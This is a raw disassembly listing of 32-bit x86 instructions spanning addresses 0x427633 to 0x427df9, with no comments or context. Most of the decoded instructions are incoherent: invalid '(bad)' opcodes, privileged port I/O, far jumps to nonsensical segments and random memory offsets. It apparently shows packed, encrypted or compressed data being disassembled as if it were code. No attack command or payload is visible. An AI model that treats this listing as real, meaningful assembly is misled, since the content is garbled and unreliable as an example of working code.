  427633:	adc    esp,DWORD PTR [ebp+0x568f7ed0]
  427639:	push   cs
  42763a:	scas   al,BYTE PTR es:[edi]
  42763b:	mov    BYTE PTR [edi+0x38],cl
  42763e:	dec    edx
  42763f:	pop    ebx
  427640:	rcr    DWORD PTR [ebx+0x1a5c4437],cl
  427646:	xor    al,0xac
  427648:	sbb    dh,bl
  42764a:	pop    ebp
  42764b:	test   eax,0x237ef299
  427650:	clc    
  427651:	push   ebp
  427652:	inc    ebx
  427653:	sub    DWORD PTR [eax],0x7da4fb75
  427659:	cdq    
  42765a:	in     al,dx
  42765b:	in     al,dx
  42765c:	lahf   
  42765d:	mov    al,BYTE PTR [edi]
  42765f:	arpl   WORD PTR [esi-0x2b1c2d44],si
  427665:	sub    ebx,DWORD PTR [ecx]
  427667:	push   0xffffffb7
  427669:	outs   dx,DWORD PTR ds:[esi]
  42766a:	sub    DWORD PTR [edi+0x47],esp
  42766d:	inc    ebx
  42766e:	dec    ebx
  42766f:	adc    bh,BYTE PTR [ebp-0x2c8f8c02]
  427675:	aas    
  427676:	push   0xffffffaa
  427678:	fbstp  TBYTE PTR [esi+0x24]
  42767b:	stc    
  42767c:	call   DWORD PTR [esi-0x16]
  42767f:	scas   eax,DWORD PTR es:[edi]
  427680:	inc    edi
  427681:	popf   
  427682:	fsubr  DWORD PTR [edi+0x3ab9e422]
  427688:	imul   ebx,DWORD PTR [edi+edx*4+0x3eed0b],0x0
	...
  427698:	add    BYTE PTR [eax],al
  42769a:	cdq    
  42769b:	enter  0x9ff8,0xf9
  42769f:	mov    edi,0xcf7dceff
  4276a4:	stc    
  4276a5:	popf   
  4276a6:	hlt    
  4276a7:	sar    BYTE PTR [esi+0x1ec3458],cl
  4276ad:	add    ah,bh
  4276af:	add    DWORD PTR [eax],eax
  4276b1:	add    BYTE PTR [esi+0x7c],al
  4276b4:	mov    esi,0xb50110ab
  4276b9:	(bad)  [eax]
  4276bb:	arpl   WORD PTR [esi+0x63],dx
  4276be:	in     eax,dx
  4276bf:	arpl   WORD PTR [edi],ax
  4276c1:	es es icebp 
  4276c4:	neg    BYTE PTR es:[ecx]
  4276c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276c8:	mov    al,0x87
  4276ca:	outs   dx,DWORD PTR ds:[esi]
  4276cb:	leave  
  4276cc:	cdq    
  4276cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4276ce:	xchg   esp,eax
  4276cf:	jle    0x427701
  4276d1:	sub    esi,ebx
  4276d3:	sub    al,0x88
  4276d6:	push   ss
  4276d7:	jns    0x427702
  4276d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4276da:	dec    edi
  4276db:	mov    BYTE PTR [ecx-0x46],bh
  4276de:	sti    
  4276df:	dec    edx
  4276e0:	loope  0x42774e
  4276e2:	fiadd  DWORD PTR [edx]
  4276e4:	pop    DWORD PTR [eax+0x65bd320f]
  4276ea:	sti    
  4276eb:	stos   DWORD PTR es:[edi],eax
  4276ec:	mov    bl,0x20
  4276ee:	pop    eax
  4276ef:	sbb    al,bl
  4276f1:	ja     0x4276f0
  4276f3:	idiv   BYTE PTR [eax-0x55]
  4276f6:	inc    esp
  4276f7:	call   0x71a8c904
  4276fc:	cmp    ah,bh
  4276fe:	dec    esi
  4276ff:	or     al,0x8c
  427701:	nop
  427702:	jmp    0x451:0xa1df172f
  427709:	rol    DWORD PTR ss:[ecx],1
  42770c:	lahf   
  42770d:	or     BYTE PTR [edi],cl
  42770f:	inc    esp
  427710:	das    
  427711:	mov    ebx,0x21791e2
  427716:	add    ecx,0x5fd4abda
  42771c:	(bad)  
  42771d:	into   
  42771e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42771f:	ror    dl,0xa0
  427722:	pop    cx
  427724:	dec    eax
  427725:	(bad)  
  427726:	loope  0x4276dc
  427728:	mov    WORD PTR [edi-0x17],ds
  42772b:	xchg   esp,eax
  42772c:	jecxz  0x4276d5
  42772e:	rcr    DWORD PTR [esi+0x60],cl
  427731:	ins    BYTE PTR es:[edi],dx
  427732:	shl    DWORD PTR ds:0xf13af439,0x28
  427739:	shr    BYTE PTR [ecx],1
  42773b:	out    0xfd,al
  42773d:	jmp    0x42779e
  42773f:	mov    edi,0xec31d84
  427744:	mov    eax,0x53bc4276
  427749:	dec    eax
  42774a:	mov    esp,0xa9e24d1d
  42774f:	rol    BYTE PTR [ebx],cl
  427751:	les    ebx,FWORD PTR [edx]
  427753:	aam    0x70
  427755:	pop    ss
  427756:	xchg   ecx,eax
  427757:	(bad)  
  427758:	sub    eax,0xe79ed93e
  42775d:	jmp    DWORD PTR [esi+esi*1]
  427760:	mov    ch,0xd2
  427762:	cmp    bh,BYTE PTR [edi+ecx*2]
  427765:	jmp    0x4277a4
  427767:	daa    
  427768:	pop    eax
  427769:	dec    ebp
  42776a:	gs mov bh,0x9f
  42776d:	test   eax,0x49241e81
  427772:	jp     0x4277f1
  427774:	stos   DWORD PTR es:[edi],eax
  427775:	dec    esi
  427776:	cdq    
  427777:	mov    edi,0x177473e1
  42777c:	sbb    ch,ch
  42777e:	ficom  DWORD PTR [ebp-0x69]
  427781:	cmp    ch,BYTE PTR [ebp-0x80]
  427784:	imul   ecx,DWORD PTR [esi],0x96aab52a
  42778a:	aaa    
  42778b:	fmul   QWORD PTR [ebp+0x2475fa59]
  427791:	test   BYTE PTR [edi],dl
  427793:	sti    
  427794:	sbb    BYTE PTR [eax+0x15],0x14
  427798:	sub    BYTE PTR [eax+0x14],cl
  42779b:	data16 jp 0x427801
  42779e:	into   
  42779f:	push   ds
  4277a0:	(bad)  
  4277a1:	(bad)  
  4277a2:	pop    ebp
  4277a3:	jbe    0x42772f
  4277a5:	cmovg  edi,DWORD PTR [edx+0x1c]
  4277a9:	mov    bh,0xc9
  4277ab:	mov    eax,ds:0xa51d9004
  4277b0:	adc    al,0x47
  4277b2:	rol    DWORD PTR [ebp+0x27649196],1
  4277b8:	(bad)  
  4277b9:	js     0x42780e
  4277bb:	sbb    DWORD PTR [ebp+ebp*2+0x77],edx
  4277bf:	stos   DWORD PTR es:[edi],eax
  4277c0:	or     al,0x8b
  4277c2:	(bad)  
  4277c3:	out    dx,al
  4277c4:	fimul  WORD PTR [edx-0x3c]
  4277c7:	and    BYTE PTR [ecx-0x1f],0x67
  4277cb:	cmp    ecx,edi
  4277cd:	mov    cl,0xe
  4277cf:	out    0x2b,eax
  4277d1:	dec    esi
  4277d2:	add    DWORD PTR [ecx],ebx
  4277d4:	ret    
  4277d5:	add    al,0xc0
  4277d7:	mov    edx,0x58da3e3c
  4277dc:	mov    ds:0xba23e11c,al
  4277e1:	cmp    cl,bl
  4277e3:	sub    BYTE PTR [edx+eiz*8+0x2ec7c229],0xc0
  4277eb:	xor    DWORD PTR [eax+0x74088610],ebx
  4277f1:	cmp    al,0x97
  4277f3:	jb     0x4277c7
  4277f5:	push   ebx
  4277f6:	cli    
  4277f7:	popf   
  4277f8:	iret   
  4277f9:	adc    DWORD PTR [ecx-0x31],0x4a9932de
  427800:	fisubr DWORD PTR [ecx+eax*4]
  427803:	addr16 jne 0x427838
  427806:	xor    eax,0x8c14974a
  42780b:	jecxz  0x42783d
  42780d:	scas   eax,DWORD PTR es:[edi]
  42780e:	cmp    eax,0xd543a820
  427813:	inc    eax
  427814:	call   FWORD PTR [eax]
  427816:	cs dec ebx
  427818:	jne    0x42780c
  42781a:	fdiv   DWORD PTR [edi+0x7c701e6f]
  427820:	push   ss
  427821:	pop    ds
  427822:	mov    ch,0x3
  427824:	neg    BYTE PTR [esi+esi*1-0xd1153c3]
  42782b:	gs pop ecx
  42782d:	xchg   bl,ah
  42782f:	and    ecx,DWORD PTR [ecx-0x6f]
  427832:	out    0x66,al
  427834:	lock or eax,0xe9efdfa2
  42783a:	mov    BYTE PTR [ebx+eax*4-0x75],dl
  42783e:	out    dx,eax
  42783f:	rep outs dx,BYTE PTR ds:[esi]
  427841:	mov    bl,al
  427843:	pop    ebp
  427844:	lock loope 0x4277cf
  427847:	jg     0x42781b
  427849:	inc    edx
  42784a:	sub    al,0x93
  42784c:	xchg   edx,eax
  42784d:	mov    ebp,0x28a635f7
  427852:	mov    dh,0x3
  427854:	jae    0x4277d8
  427856:	jnp    0x4278c0
  427858:	mov    dl,0x50
  42785a:	sub    dh,dh
  42785c:	xor    ah,al
  42785e:	and    BYTE PTR [edi+0x76b6e38d],bh
  427864:	scas   eax,DWORD PTR es:[edi]
  427865:	and    al,al
  427867:	icebp  
  427868:	es inc edx
  42786a:	into   
  42786b:	rcr    al,0x3e
  42786e:	repnz add al,0xc
  427871:	imul   edx,DWORD PTR [edi-0x60],0x24cf9d3b
  427878:	dec    esp
  427879:	mov    ebx,ebx
  42787b:	push   ebp
  42787c:	mov    ss,eax
  42787e:	xor    al,BYTE PTR [eax]
  427880:	fs icebp 
  427882:	mov    ecx,0x4f07aca6
  427887:	arpl   bp,cx
  427889:	xchg   DWORD PTR [edi+0x31],eax
  42788c:	out    0xb1,al
  42788e:	in     al,dx
  42788f:	pop    ecx
  427890:	icebp  
  427891:	push   ss
  427892:	push   0xb39ed187
  427897:	or     cl,BYTE PTR [ebx-0x1d]
  42789a:	dec    esp
  42789b:	mov    ecx,0xa624bffd
  4278a0:	cmp    eax,0x28181baa
  4278a5:	xor    eax,0xb82887d5
  4278aa:	leave  
  4278ab:	adc    al,0x66
  4278ad:	aas    
	...
  4278ba:	jns    0x4278c6
  4278bc:	sbb    BYTE PTR gs:[edi+0x7f],dh
  4278c0:	jge    0x42792d
  4278c2:	and    DWORD PTR [ebp+0x30],ecx
  4278c5:	dec    esi
  4278c6:	mov    ebp,0x3029461c
  4278cb:	out    dx,al
  4278cc:	add    DWORD PTR [eax],eax
  4278ce:	cld    
  4278cf:	add    DWORD PTR [eax],eax
  4278d1:	add    BYTE PTR [edi+0x13feef9e],ah
  4278d7:	aam    0xf6
  4278d9:	adc    BYTE PTR [eax+0x2a63b32b],al
  4278df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4278e0:	mov    eax,0x384d2da7
  4278e5:	dec    ebp
  4278e6:	jge    0x4278e0
  4278e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4278e9:	xor    eax,0x721b1406
  4278ee:	mov    ebx,0xb9dd058a
  4278f3:	xchg   ecx,eax
  4278f4:	mov    bl,0xa6
  4278f6:	data16 xlat BYTE PTR ds:[ebx]
  4278f8:	mov    ch,0x38
  4278fa:	in     al,dx
  4278fb:	(bad)  
  4278fc:	les    edx,FWORD PTR ds:[edx+edi*8]
  427900:	scas   eax,DWORD PTR es:[edi]
  427901:	mov    ?,WORD PTR [ebp-0x3d]
  427904:	jne    0xcc80
  427909:	and    BYTE PTR [edi+edi*8-0x3b],cl
  42790d:	inc    eax
  42790e:	mov    ecx,0x74c2f1e8
  427913:	pop    ss
  427914:	les    ebx,FWORD PTR [ebx-0x76]
  427917:	add    bl,BYTE PTR [ecx]
  427919:	loopne 0x42798c
  42791b:	ins    BYTE PTR es:[edi],dx
  42791c:	add    ch,BYTE PTR [eax+esi*1+0x53519264]
  427923:	xor    eax,0x44f9a501
  427928:	sub    eax,0x8a19cf95
  42792d:	outs   dx,DWORD PTR ds:[esi]
  42792e:	inc    ebp
  42792f:	and    DWORD PTR [esi],ebx
  427931:	mov    esi,0xd3534bad
  427936:	xor    DWORD PTR ds:0x185675ab,ecx
  42793c:	jmp    0x4278e8
  42793e:	ins    DWORD PTR es:[edi],dx
  42793f:	arpl   si,di
  427941:	push   es
  427942:	xchg   DWORD PTR [eax],eax
  427944:	ret    0x7b1d
  427947:	call   0xa71d0c52
  42794c:	sbb    edi,DWORD PTR [edi]
  42794e:	iret   
  42794f:	inc    edi
  427950:	xabort 0xbd
  427953:	pop    edx
  427954:	imul   DWORD PTR [esi-0x5b41a7d9]
  42795a:	call   0xdc00:0x8f4c85d5
  427961:	dec    ebx
  427962:	pusha  
  427963:	xor    DWORD PTR [esi-0x6f],ebp
  427966:	lods   al,BYTE PTR ds:[esi]
  427967:	stc    
  427968:	test   al,0xeb
  42796a:	inc    cx
  42796c:	dec    ebp
  42796d:	cmp    DWORD PTR [edi+ebx*1-0x7b],eax
  427971:	out    0xca,al
  427973:	popa   
  427974:	inc    esi
  427975:	xchg   esp,eax
  427976:	sbb    esi,0x76
  427979:	scas   al,BYTE PTR es:[edi]
  42797a:	or     al,0xac
  42797c:	js     0x42799b
  42797e:	dec    edx
  42797f:	lahf   
  427980:	ret    0x8008
  427983:	xchg   esp,eax
  427984:	cmp    ah,0xc8
  427987:	inc    esi
  427988:	mov    ebx,fs
  42798a:	push   esp
  42798b:	jno    0x4279bf
  42798d:	and    edx,DWORD PTR [esi]
  42798f:	or     BYTE PTR [edx+esi*2+0x6c],cl
  427993:	lock jae 0x4279c1
  427996:	sbb    BYTE PTR [esi],0x2e
  427999:	mov    ch,0x91
  42799b:	sub    DWORD PTR [edx+edi*8+0x2742d043],0xffffffeb
  4279a3:	jg     0x42793d
  4279a5:	daa    
  4279a6:	mov    ecx,0xeea23bc8
  4279ab:	(bad)  
  4279ac:	mov    ecx,0x7faf87aa
  4279b1:	add    edx,0xca1b2639
  4279b7:	popa   
  4279b8:	loope  0x427a2a
  4279ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4279bb:	ins    DWORD PTR es:[edi],dx
  4279bc:	mov    bh,0xdb
  4279be:	aaa    
  4279bf:	nop
  4279c0:	jb     0x427a1d
  4279c2:	xor    BYTE PTR [eax-0x1e5ff076],ah
  4279c8:	and    esp,eax
  4279ca:	inc    ecx
  4279cb:	in     al,dx
  4279cc:	cmp    al,0xf5
  4279ce:	and    ebp,edi
  4279d0:	adc    BYTE PTR [eax+0x75828087],dl
  4279d6:	and    al,0x6f
  4279d8:	jns    0x427a12
  4279da:	jmp    0x4279d5
  4279dc:	xor    DWORD PTR [edi+0x37],edi
  4279df:	cmp    ebx,DWORD PTR [ecx]
  4279e1:	les    esi,FWORD PTR [edx+eax*8]
  4279e4:	sub    ah,0x93
  4279e7:	ja     0x427969
  4279e9:	and    al,0x11
  4279eb:	or     cl,0x0
  4279ee:	mov    ecx,0x8dbd2744
  4279f3:	lea    ebp,[edx-0x77]
  4279f6:	add    BYTE PTR [ecx+0x54d47812],ah
  4279fc:	push   esi
  4279fd:	jl     0x427a6e
  4279ff:	adc    eax,0xf8a63a81
  427a04:	cmp    BYTE PTR [ebx-0xc],ah
  427a07:	push   esi
  427a08:	out    dx,eax
  427a09:	(bad)  
  427a0a:	jno    0x427a16
  427a0c:	jle    0x427a7d
  427a0e:	ins    BYTE PTR es:[edi],dx
  427a0f:	jl     0x4279e3
  427a11:	das    
  427a12:	in     al,0x7a
  427a14:	push   0xb2132d31
  427a19:	mov    dh,0x45
  427a1b:	jle    0x427a98
  427a1d:	(bad)  
  427a1e:	test   eax,0xd7cb374c
  427a23:	clc    
  427a24:	stc    
  427a25:	xor    edx,edi
  427a27:	addr16 dec ecx
  427a29:	loope  0x427a71
  427a2b:	jg     0x427a78
  427a2d:	imul   ebp,DWORD PTR [esi+0x78],0x83e1269c
  427a34:	and    eax,0xbede0525
  427a39:	mov    bh,0x4c
  427a3b:	jecxz  0x4279ef
  427a3d:	(bad)
  427a40:	or     DWORD PTR [eax-0xd],edx
  427a43:	jg     0x427a3c
  427a45:	scas   al,BYTE PTR es:[edi]
  427a46:	pop    edx
  427a47:	or     eax,0xc1598ba6
  427a4c:	push   edi
  427a4d:	inc    esp
  427a4e:	std    
  427a4f:	lds    eax,FWORD PTR [esi-0x23be9d88]
  427a55:	mov    ecx,0xffe4e8ab
  427a5a:	shr    al,cl
  427a5c:	lahf   
  427a5d:	imul   esi,DWORD PTR ds:0x1cd8bb21,0x2400066e
  427a67:	sub    esp,DWORD PTR [ebx+edi*1-0x74]
  427a6b:	xchg   edx,eax
  427a6c:	sub    edi,DWORD PTR [edx+esi*2+0x42]
  427a70:	inc    edi
  427a71:	jg     0x427a1d
  427a73:	outs   dx,BYTE PTR ds:[esi]
  427a74:	sbb    BYTE PTR ds:0x9749c3ab,dh
  427a7a:	popf   
  427a7b:	leave  
  427a7c:	nop
  427a7d:	jnp    0x427a83
  427a7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a80:	or     esp,DWORD PTR [edx+0x3d1cca95]
  427a86:	call   0x6f4c2c49
  427a8b:	retf   0xeaf9
  427a8e:	jo     0x427a29
  427a90:	and    edx,esi
  427a92:	loope  0x427a43
  427a94:	sub    esp,DWORD PTR [ebx-0x53]
  427a97:	inc    ebx
  427a98:	mov    al,0x60
  427a9a:	call   0xcff3ef2d
  427a9f:	shl    DWORD PTR [ebx+0x6],cl
  427aa2:	ret    
  427aa3:	out    0xa5,al
  427aa5:	jb     0x427aec
  427aa7:	dec    eax
  427aa8:	mov    ds:0x4a983936,al
  427aad:	in     eax,dx
  427aae:	pusha  
  427aaf:	inc    edx
  427ab0:	lods   al,BYTE PTR ds:[esi]
  427ab1:	add    esp,edx
  427ab3:	sub    eax,0x206fcdbc
  427ab8:	clc    
  427ab9:	sahf   
  427aba:	aam    0x8c
  427abc:	mov    WORD PTR [ebp+0x54],?
  427abf:	pushf  
  427ac0:	fsubr  st,st(3)
  427ac2:	leave  
  427ac3:	mov    esi,0x62fe48d3
  427ac8:	sti    
  427ac9:	cs gs cmp al,0x5
  427acd:	out    0x0,eax
	...
  427ad7:	add    BYTE PTR [eax],al
  427ad9:	add    BYTE PTR [ecx+0x3],bl
  427adc:	rol    DWORD PTR [ebx+ebx*8-0x3a],0xdd
  427ae1:	pop    ds
  427ae2:	arpl   WORD PTR [edi-0x763ab294],di
  427ae8:	stos   DWORD PTR es:[edi],eax
  427ae9:	pop    es
  427aea:	sub    al,0xf0
  427aec:	add    DWORD PTR [eax],eax
  427aee:	cld    
  427aef:	add    DWORD PTR [eax],eax
  427af1:	add    ch,bh
  427af3:	push   ebx
  427af4:	out    0x87,al
  427af6:	pop    ds
  427af7:	fdivr  DWORD PTR [edx+eax*4-0x73bb517e]
  427afe:	test   ch,al
  427b00:	adc    bh,dl
  427b02:	adc    al,0xa2
  427b04:	xor    DWORD PTR [ebp+0x33c9f27],ebp
  427b0a:	scas   al,BYTE PTR es:[edi]
  427b0b:	test   DWORD PTR [ebx],0xebe04fa
  427b11:	mov    ah,0xfb
  427b13:	jle    0x427b58
  427b15:	mov    bl,0x45
  427b17:	hlt    
  427b18:	xchg   ebx,eax
  427b19:	cmp    eax,0x7ca99c1a
  427b1e:	in     al,0x8b
  427b20:	lods   eax,DWORD PTR ds:[esi]
  427b21:	lds    ebx,FWORD PTR [eax]
  427b23:	arpl   WORD PTR [eax+0x638ccef5],sp
  427b29:	daa    
  427b2a:	jecxz  0x427baa
  427b2c:	dec    esp
  427b2d:	mov    esi,0x15dc2a7b
  427b32:	bound  esi,QWORD PTR [edi]
  427b34:	or     dh,BYTE PTR [esi-0x2c1e14b2]
  427b3a:	pop    edx
  427b3b:	sub    BYTE PTR [edi],bl
  427b3d:	xor    al,0x63
  427b3f:	or     eax,0xf9f6724
  427b44:	retf   
  427b45:	stc    
  427b46:	adc    ecx,esi
  427b48:	mov    bl,0x6f
  427b4a:	xor    ch,BYTE PTR [edx-0x8]
  427b4d:	dec    eax
  427b4e:	push   esp
  427b4f:	repz aam 0x6e
  427b52:	lods   al,BYTE PTR ds:[esi]
  427b53:	pop    eax
  427b54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b55:	push   ss
  427b56:	js     0x427b2c
  427b58:	lea    ebx,[ecx+0x14]
  427b5b:	xor    al,0xe2
  427b5d:	lds    ebp,FWORD PTR [esi-0x3dc830c9]
  427b63:	jg     0x427ba7
  427b65:	push   ss
  427b66:	push   ebp
  427b67:	inc    ebx
  427b68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b69:	dec    edx
  427b6a:	and    BYTE PTR [eax],0xc
  427b6d:	iret   
  427b6e:	lahf   
  427b6f:	and    DWORD PTR [ebp-0x49],0xfb934c0e
  427b76:	icebp  
  427b77:	push   0x77
  427b79:	inc    esp
  427b7a:	ins    DWORD PTR es:[edi],dx
  427b7b:	ss mov al,0x44
  427b7e:	iret   
  427b7f:	xor    BYTE PTR [esi-0xf212ce2],cl
  427b85:	fnstenv [eiz*2-0x33157a5]
  427b8c:	xlat   BYTE PTR ds:[ebx]
  427b8d:	sahf   
  427b8e:	mov    eax,0x445bb188
  427b93:	mov    al,ds:0x4367517e
  427b98:	fisub  WORD PTR [ebx-0x5bc1c3a6]
  427b9e:	ficomp WORD PTR [ebp-0x5a945041]
  427ba4:	lock jmp 0x49dc:0x1229cb2e
  427bac:	fsub   QWORD PTR [esi+0x2638667]
  427bb2:	fstp   DWORD PTR ds:0xa5cf6ff0
  427bb8:	jecxz  0x427b43
  427bba:	jo     0x427c01
  427bbc:	lahf   
  427bbd:	adc    ch,dl
  427bbf:	mov    BYTE PTR [eax-0x34d87876],bl
  427bc5:	jle    0x427bc8
  427bc7:	sbb    esi,edi
  427bc9:	adc    BYTE PTR [ebp-0x33e39417],0x26
  427bd0:	mov    al,0x4a
  427bd2:	push   ss
  427bd3:	mov    ch,0xf8
  427bd5:	xchg   DWORD PTR [esi-0x5cd883f6],ebp
  427bdb:	push   0xffffff86
  427bdd:	push   eax
  427bde:	pop    ss
  427bdf:	(bad)  
  427be0:	icebp  
  427be1:	outs   dx,BYTE PTR ds:[esi]
  427be2:	jno    0x427bce
  427be4:	fwait
  427be5:	out    dx,al
  427be6:	sbb    ch,BYTE PTR [esi+ebp*8]
  427be9:	loope  0x427c35
  427beb:	push   cs
  427bec:	aaa    
  427bed:	pop    esi
  427bee:	sbb    eax,DWORD PTR [ebx-0x3b99d5e3]
  427bf4:	out    dx,eax
  427bf5:	fisub  DWORD PTR [edx+0x4ec9cbbf]
  427bfb:	in     eax,dx
  427bfc:	mov    dh,0x10
  427bfe:	jbe    0x427bb9
  427c00:	in     eax,dx
  427c01:	xor    BYTE PTR [ebx],bh
  427c03:	into   
  427c04:	mov    dh,0x25
  427c06:	inc    esp
  427c07:	fist   WORD PTR [esi]
  427c09:	ins    BYTE PTR es:[edi],dx
  427c0a:	aad    0x96
  427c0c:	mov    ecx,0x277b4d02
  427c11:	mov    eax,ds:0x89934eb0
  427c16:	mov    eax,ds:0x4f83bdfa
  427c1b:	or     ch,ch
  427c1d:	(bad)  
  427c1e:	lods   eax,DWORD PTR ds:[esi]
  427c1f:	hlt    
  427c20:	rol    DWORD PTR [ebx+0x1db574b0],0xc8
  427c27:	shr    DWORD PTR [edi+0x67d9608b],1
  427c2d:	cmp    BYTE PTR ds:0x95bdf334,al
  427c33:	mov    bl,BYTE PTR [edi+0x128272e]
  427c39:	ins    DWORD PTR es:[edi],dx
  427c3a:	popf   
  427c3b:	clc    
  427c3c:	fidiv  WORD PTR [eax+0x58b39fc8]
  427c42:	mov    esi,0x6ca0fcdb
  427c47:	or     DWORD PTR [eax+0x24],edi
  427c4a:	cmp    DWORD PTR [edx-0x20af3a14],0xe2d2ce31
  427c54:	aaa    
  427c55:	not    DWORD PTR [esi-0x4c]
  427c58:	(bad)  
  427c59:	jl     0x427c7b
  427c5b:	pop    edi
  427c5c:	inc    ebp
  427c5d:	(bad)  
  427c5e:	out    0x4c,eax
  427c60:	dec    ebp
  427c61:	inc    ecx
  427c62:	fcomp  DWORD PTR [ebx+0x2c]
  427c65:	jl     0x427cd1
  427c67:	std    
  427c68:	daa    
  427c69:	jne    0x427c9a
  427c6b:	add    ah,BYTE PTR [eax+0x2a7d03b6]
  427c71:	pop    esp
  427c72:	xchg   ebp,eax
  427c73:	push   ds
  427c74:	xchg   ebx,eax
  427c75:	pop    edi
  427c76:	cmc    
  427c77:	sbb    al,0xff
  427c79:	and    eax,esp
  427c7b:	add    DWORD PTR [edi+0x13],0xdc1a2e47
  427c82:	pop    es
  427c83:	out    0xd0,al
  427c85:	imul   ebx,DWORD PTR [ebx+0x5a],0xba154bd3
  427c8c:	nop
  427c8d:	stc    
  427c8e:	sbb    eax,ecx
  427c90:	daa    
  427c91:	push   esi
  427c92:	push   ds
  427c93:	jg     0x427c92
  427c95:	int3   
  427c96:	lods   al,BYTE PTR ds:[esi]
  427c97:	push   ebp
  427c98:	in     al,0xfb
  427c9a:	clc    
  427c9b:	in     al,dx
  427c9c:	push   ds
  427c9d:	repnz xchg edx,eax
  427c9f:	hlt    
  427ca0:	scas   eax,DWORD PTR es:[edi]
  427ca1:	pop    ecx
  427ca2:	sub    ebx,edx
  427ca4:	popf   
  427ca5:	dec    edx
  427ca6:	and    DWORD PTR [esi],edx
  427ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ca9:	sub    BYTE PTR [edx+0x6e89dbca],bl
  427caf:	ficomp WORD PTR ds:0xccf79a62
  427cb5:	dec    esi
  427cb6:	rol    DWORD PTR [edx],1
  427cb8:	test   al,0xf7
  427cba:	jb     0x427cea
  427cbc:	jae    0x427d02
  427cbe:	xor    DWORD PTR [ebx-0x53],ebp
  427cc1:	xor    ebx,DWORD PTR [eax]
  427cc3:	add    al,0x11
  427cc5:	popa   
  427cc6:	and    DWORD PTR [eax-0x3b],0x8c7407f6
  427ccd:	out    0xfb,eax
  427ccf:	mov    edi,0x4448eca8
  427cd4:	dec    eax
  427cd5:	inc    edi
  427cd6:	in     al,dx
  427cd7:	pop    ecx
  427cd8:	fbld   TBYTE PTR [ecx]
  427cda:	in     eax,0x46
  427cdc:	sub    ch,BYTE PTR [eax-0x35fffcc3]
  427ce2:	or     ah,bh
  427ce4:	dec    esi
  427ce5:	loop   0x427cde
  427ce7:	xchg   edi,eax
  427ce8:	out    dx,eax
  427ce9:	test   al,0xbf
  427ceb:	sbb    edx,ecx
  427ced:	adc    al,BYTE PTR [eax]
	...
  427cf7:	add    BYTE PTR [eax],al
  427cf9:	add    BYTE PTR [ebx],bl
  427cfb:	daa    
  427cfc:	pushf  
  427cfd:	cli    
  427cfe:	mov    esp,0xaae77ffb
  427d03:	xchg   esp,eax
  427d04:	out    dx,eax
  427d05:	cdq    
  427d06:	jbe    0x427cfa
  427d08:	mov    edi,0x1f228b6
  427d0d:	add    ah,bh
  427d0f:	add    DWORD PTR [eax],eax
  427d11:	add    BYTE PTR [edi+0x31dee6b3],bl
  427d17:	data16 out 0x62,al
  427d1a:	jmp    0x427d1f
  427d1c:	sub    ecx,DWORD PTR [edi]
  427d1e:	imul   esp,DWORD PTR [edi],0x49357bb
  427d24:	xchg   ecx,eax
  427d25:	mov    ecx,0x5a703de8
  427d2a:	jb     0x427d2f
  427d2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d2d:	xor    edx,DWORD PTR [ecx]
  427d2f:	lahf   
  427d30:	int    0x6e
  427d32:	push   ebx
  427d33:	sbb    BYTE PTR [ebx],dh
  427d35:	add    al,0xa
  427d37:	sar    DWORD PTR [eax],cl
  427d39:	jnp    0x427d3f
  427d3b:	sub    eax,0x4463362a
  427d40:	imul   DWORD PTR es:[edi+0x33]
  427d44:	push   ebp
  427d45:	adc    BYTE PTR [ecx],0xa4
  427d48:	or     bh,BYTE PTR [ebx]
  427d4a:	(bad)  
  427d4b:	cmp    al,0x3b
  427d4d:	loope  0x427cde
  427d4f:	sti    
  427d50:	sbb    DWORD PTR [ecx+edi*4-0x4f],ecx
  427d54:	dec    edi
  427d55:	dec    DWORD PTR [ecx-0x667fdede]
  427d5b:	call   0x8ec1:0x1ac85815
  427d62:	xchg   esp,eax
  427d63:	(bad)  
  427d65:	fnsave [esi-0x45f027d]
  427d6b:	dec    edx
  427d6c:	out    0xb,eax
  427d6e:	inc    esi
  427d6f:	and    al,0x6
  427d71:	fiadd  WORD PTR [edi+0x54b72933]
  427d77:	mov    dl,0x85
  427d79:	in     al,dx
  427d7a:	inc    edi
  427d7b:	xor    al,0x40
  427d7d:	push   es
  427d7e:	shl    BYTE PTR [esi+ebx*2-0x1a],cl
  427d82:	arpl   WORD PTR [ebp-0x3fad6c0],cx
  427d88:	ss mov ecx,0x43850bd2
  427d8e:	ficom  DWORD PTR [edx]
  427d90:	loop   0x427d9c
  427d92:	pop    ebp
  427d93:	fcomp  DWORD PTR [ebx+0x7915a04d]
  427d99:	mov    ebp,0x2854fc61
  427d9e:	adc    eax,0x40fc4985
  427da3:	inc    edi
  427da4:	jp     0x427d93
  427da6:	ins    BYTE PTR es:[edi],dx
  427da7:	js     0x427d98
  427da9:	js     0x427dcb
  427dab:	sahf   
  427dac:	inc    esi
  427dad:	div    DWORD PTR [ecx+0x31]
  427db0:	and    edx,ecx
  427db2:	jmp    0x10199bd6
  427db7:	xor    ch,BYTE PTR [eax+0x423d15d3]
  427dbd:	lods   eax,DWORD PTR ds:[esi]
  427dbe:	aaa    
  427dbf:	mov    al,ds:0x992785f3
  427dc4:	mov    ah,0x87
  427dc6:	rcr    BYTE PTR [esi],cl
  427dc8:	jmp    0x94ddd8b6
  427dcd:	inc    ebp
  427dce:	mov    BYTE PTR [ecx+0x33],bl
  427dd1:	mov    dh,0x9a
  427dd3:	pop    eax
  427dd4:	sbb    DWORD PTR [eax+0x2b0dbb70],eax
  427dda:	punpcklbw mm1,mm3
  427ddd:	cmp    ebx,DWORD PTR [ebp+eiz*2+0x23]
  427de1:	inc    ebx
  427de2:	or     eax,0xa337dde
  427de7:	jae    0x427deb
  427de9:	ja     0x427d7f
  427deb:	retf   
  427dec:	dec    DWORD PTR [esp+ebx*1]
  427def:	cmp    BYTE PTR [ebp-0x3173527f],bh
  427df5:	mov    al,0x25
  427df7:	loopne 0x427dae
  427df9:	cdq    
